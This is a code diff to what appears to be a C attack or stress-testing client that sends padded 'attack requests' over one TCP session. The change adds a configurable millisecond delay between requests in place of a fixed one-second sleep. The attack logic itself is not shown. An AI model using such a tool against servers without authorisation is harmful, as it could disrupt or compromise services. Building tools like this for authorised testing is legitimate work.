@@ -1,3 +1,5 @@
+#define _POSIX_C_SOURCE 200809L
+
 #include <arpa/inet.h>
 #include <errno.h>
 #include <netinet/tcp.h>
@@ -47,6 +49,7 @@ typedef struct
     int verbose;
     unsigned int seed;
     int count;
+    unsigned int interval_ms;
 } bot_cfg_t;
 
 typedef struct
@@ -68,6 +71,7 @@ static void usage(const char *prog)
             "  -prefix <TEXT>     prefix text added before generated padding\n"
             "  -suffix <TEXT>     suffix text added after generated padding\n"
             "  -count <N>         number of attack requests on same session\n"
+            "  -interval-ms <N>   delay between attack requests in milliseconds\n"
             "  -seed <N>          random seed (default 0 = time)\n"
             "  -verbose           verbose output\n",
             prog);
@@ -256,6 +260,29 @@ static int send_all(int fd, const char *buf, size_t len)
         off += (size_t)n;
     }
     return 0;
+}
+
+static void sleep_ms(unsigned int interval_ms)
+{
+    struct timespec req;
+    struct timespec rem;
+
+    if (interval_ms == 0U)
+    {
+        return;
+    }
+
+    req.tv_sec = (time_t)(interval_ms / 1000U);
+    req.tv_nsec = (long)(interval_ms % 1000U) * 1000000L;
+
+    while (nanosleep(&req, &rem) != 0)
+    {
+        if (errno != EINTR)
+        {
+            break;
+        }
+        req = rem;
+    }
 }
 
 static void print_tcp_info(int fd)
@@ -539,6 +566,10 @@ static void set_default_sizes(bot_cfg_t *cfg)
     {
         cfg->count = 20;
     }
+    if (cfg->interval_ms == 0U)
+    {
+        cfg->interval_ms = 1000U;
+    }
 }
 
 int main(int argc, char **argv)
@@ -606,6 +637,10 @@ int main(int argc, char **argv)
         else if (strcmp(argv[i], "-count") == 0 && i + 1 < argc)
         {
             cfg.count = (int)parse_size_or_die(argv[++i], "count");
+        }
+        else if (strcmp(argv[i], "-interval-ms") == 0 && i + 1 < argc)
+        {
+            cfg.interval_ms = (unsigned int)parse_size_or_die(argv[++i], "interval-ms");
         }
         else if (strcmp(argv[i], "-seed") == 0 && i + 1 < argc)
         {
@@ -716,7 +751,10 @@ int main(int argc, char **argv)
             print_tcp_info(fd);
         }
         free(attack_req);
-        sleep(1);
+        if (i + 1 < cfg.count)
+        {
+            sleep_ms(cfg.interval_ms);
+        }
     }
 
     close(fd);
